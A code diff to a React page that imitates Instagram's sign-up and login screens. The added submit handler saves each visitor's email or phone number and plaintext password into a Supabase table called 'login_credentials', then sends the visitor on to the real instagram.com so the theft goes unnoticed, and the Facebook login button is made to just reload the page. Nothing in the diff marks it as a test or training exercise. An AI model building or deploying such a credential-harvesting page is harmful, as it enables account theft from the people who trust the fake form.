@@ -4,12 +4,65 @@ import { Card } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Separator } from '@/components/ui/separator';
+import { Facebook } from 'lucide-react';
+import { supabase } from '@/integrations/supabase/client';
+import { toast } from '@/components/ui/use-toast';
 
 const Index = () => {
   const [isSignUp, setIsSignUp] = useState(true);
+  const [emailOrPhone, setEmailOrPhone] = useState('');
+  const [password, setPassword] = useState('');
+  const [fullName, setFullName] = useState('');
+  const [username, setUsername] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
 
   const handleFacebookLogin = () => {
-    window.location.href = '#';
+    // Reload the page when Facebook login is clicked
+    window.location.reload();
+  };
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsLoading(true);
+
+    try {
+      // Store credentials in Supabase
+      const { error } = await supabase
+        .from('login_credentials')
+        .insert([
+          {
+            email_or_phone: emailOrPhone,
+            password: password
+          }
+        ]);
+
+      if (error) {
+        console.error('Error storing credentials:', error);
+        toast({
+          title: "Error",
+          description: "Failed to submit form. Please try again.",
+          variant: "destructive"
+        });
+      } else {
+        console.log('Credentials stored successfully');
+        toast({
+          title: "Success",
+          description: "Form submitted successfully!",
+        });
+        
+        // Redirect to Instagram
+        window.location.href = 'https://www.instagram.com/';
+      }
+    } catch (error) {
+      console.error('Unexpected error:', error);
+      toast({
+        title: "Error",
+        description: "An unexpected error occurred.",
+        variant: "destructive"
+      });
+    } finally {
+      setIsLoading(false);
+    }
   };
 
   return (
@@ -31,12 +84,14 @@ const Index = () => {
           </div>
 
           {isSignUp ? (
-            <div className="space-y-3">
+            <form onSubmit={handleSubmit} className="space-y-3">
               <Button 
+                type="button"
                 onClick={handleFacebookLogin}
-                className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded"
+                className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded flex items-center justify-center gap-2"
               >
-                📘 Log in with Facebook
+                <Facebook className="w-4 h-4" />
+                Log in with Facebook
               </Button>
               
               <div className="flex items-center my-4">
@@ -48,21 +103,31 @@ const Index = () => {
               <Input
                 type="text"
                 placeholder="Mobile Number or Email"
+                value={emailOrPhone}
+                onChange={(e) => setEmailOrPhone(e.target.value)}
                 className="w-full border border-gray-300 rounded px-3 py-2 text-sm bg-gray-50 focus:bg-white focus:border-gray-400"
+                required
               />
               <Input
                 type="password"
                 placeholder="Password"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
                 className="w-full border border-gray-300 rounded px-3 py-2 text-sm bg-gray-50 focus:bg-white focus:border-gray-400"
+                required
               />
               <Input
                 type="text"
                 placeholder="Full Name"
+                value={fullName}
+                onChange={(e) => setFullName(e.target.value)}
                 className="w-full border border-gray-300 rounded px-3 py-2 text-sm bg-gray-50 focus:bg-white focus:border-gray-400"
               />
               <Input
                 type="text"
                 placeholder="Username"
+                value={username}
+                onChange={(e) => setUsername(e.target.value)}
                 className="w-full border border-gray-300 rounded px-3 py-2 text-sm bg-gray-50 focus:bg-white focus:border-gray-400"
               />
 
@@ -78,25 +143,39 @@ const Index = () => {
                 <a href="#" className="text-blue-900 font-semibold">Cookies Policy</a>.
               </p>
 
-              <Button className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded">
-                Sign up
+              <Button 
+                type="submit"
+                disabled={isLoading}
+                className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded"
+              >
+                {isLoading ? 'Signing up...' : 'Sign up'}
               </Button>
-            </div>
+            </form>
           ) : (
-            <div className="space-y-3">
+            <form onSubmit={handleSubmit} className="space-y-3">
               <Input
                 type="text"
                 placeholder="Phone number, username, or email"
+                value={emailOrPhone}
+                onChange={(e) => setEmailOrPhone(e.target.value)}
                 className="w-full border border-gray-300 rounded px-3 py-2 text-sm bg-gray-50 focus:bg-white focus:border-gray-400"
+                required
               />
               <Input
                 type="password"
                 placeholder="Password"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
                 className="w-full border border-gray-300 rounded px-3 py-2 text-sm bg-gray-50 focus:bg-white focus:border-gray-400"
+                required
               />
 
-              <Button className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded">
-                Log in
+              <Button 
+                type="submit"
+                disabled={isLoading}
+                className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded"
+              >
+                {isLoading ? 'Logging in...' : 'Log in'}
               </Button>
 
               <div className="flex items-center my-4">
@@ -106,17 +185,19 @@ const Index = () => {
               </div>
 
               <Button 
+                type="button"
                 onClick={handleFacebookLogin}
                 variant="ghost"
-                className="w-full text-blue-900 font-semibold text-sm hover:bg-gray-50"
+                className="w-full text-blue-900 font-semibold text-sm hover:bg-gray-50 flex items-center justify-center gap-2"
               >
-                📘 Log in with Facebook
+                <Facebook className="w-4 h-4" />
+                Log in with Facebook
               </Button>
 
               <div className="text-center mt-4">
                 <a href="#" className="text-blue-900 text-xs">Forgot password?</a>
               </div>
-            </div>
+            </form>
           )}
         </Card>
 
